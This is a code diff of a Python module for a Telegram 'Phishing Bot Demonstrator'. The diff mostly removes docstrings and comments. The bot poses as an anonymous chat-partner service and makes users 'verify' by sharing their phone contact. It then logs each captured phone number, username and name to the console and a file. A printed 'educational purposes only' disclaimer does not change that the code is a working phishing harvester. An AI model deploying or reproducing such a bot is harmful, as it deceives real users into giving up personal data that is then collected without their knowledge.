@@ -15,24 +15,20 @@
 
 import csv
 
-import telebot  # fy, kakoe govno! rewrite to aiogram
+import telebot  # fy, kakoe govno! rewrite to aiogram soon
 from telebot import types
 
 from ..shared_utils import Color
 
 
 def phishing():
-    """
-    Demonstrates a social engineering scenario using a Telegram bot.
-    This tool is for educational purposes to show how personal data can be requested.
-    """
     print(
         f"\n{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.LIGHT_BLUE} Phishing Bot Demonstrator")
     print(f"{Color.YELLOW}Disclaimer: This tool is for educational purposes ONLY.")
     print(f"{Color.YELLOW}Do not use it for any malicious activities. The developers are not responsible for misuse.")
 
     try:
-        token_bot = input(
+        token_bot: str = input(
             f'\n{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.LIGHT_RED} Enter Bot token to start: {Color.RESET}').strip()
         if not token_bot:
             print(f"{Color.RED}No token provided. Aborting.")
@@ -42,7 +38,6 @@ def phishing():
             f'{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.LIGHT_GREEN} Initializing bot...')
         bot = telebot.TeleBot(token_bot, threaded=False)
         bot.delete_webhook()
-        # Check if token is valid by getting bot info
         bot.get_me()
 
     except Exception as e:
@@ -54,16 +49,14 @@ def phishing():
     print(
         f'{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.LIGHT_GREEN} Bot is running... Press Ctrl+C to stop.')
 
-    # In-memory storage for this demonstration
     waiting_users = []
     chatting_users = {}
-    verified_users = set()  # Use a set for faster lookups
+    verified_users = set()
 
     # --- Bot Handlers ---
 
     @bot.message_handler(commands=['start'])
     def start_handler(message):
-        """Handles the /start command."""
         if message.chat.id in verified_users:
             bot.send_message(message.chat.id,
                              "👋 Welcome back! You are already verified. Send /search to find a chat partner.")
@@ -76,7 +69,6 @@ def phishing():
 
     @bot.callback_query_handler(func=lambda call: call.data == 'verify')
     def verify_handler(call):
-        """Handles the 'verify' button press, asking for contact info."""
         markup = types.ReplyKeyboardMarkup(
             one_time_keyboard=True, resize_keyboard=True)
         button_contact = types.KeyboardButton(
@@ -87,7 +79,6 @@ def phishing():
 
     @bot.message_handler(content_types=['contact'])
     def contact_handler(message):
-        """Handles receiving a user's contact information."""
         if message.chat.id not in verified_users:
             verified_users.add(message.chat.id)
             user_info = {
@@ -97,7 +88,6 @@ def phishing():
                 "first_name": message.from_user.first_name,
             }
 
-            # Log the captured information to console and a file
             print(
                 f'{Color.DARK_GRAY}[{Color.LIGHT_GREEN}✔{Color.DARK_GRAY}]{Color.LIGHT_GREEN} Contact captured from @{user_info["username"]}: {user_info["phone"]}')
             try:
@@ -114,7 +104,6 @@ def phishing():
 
     @bot.message_handler(func=lambda message: message.chat.id in verified_users, content_types=['text'])
     def text_handler(message):
-        """Handles text messages from verified users."""
         if message.text == '/search':
             if message.chat.id in chatting_users:
                 bot.send_message(
@@ -150,7 +139,6 @@ def phishing():
 
     @bot.message_handler(func=lambda message: message.chat.id not in verified_users)
     def unverified_handler(message):
-        """Reminds unverified users to verify."""
         bot.send_message(
             message.chat.id, "❌ Please verify your identity first by sending /start.")
 
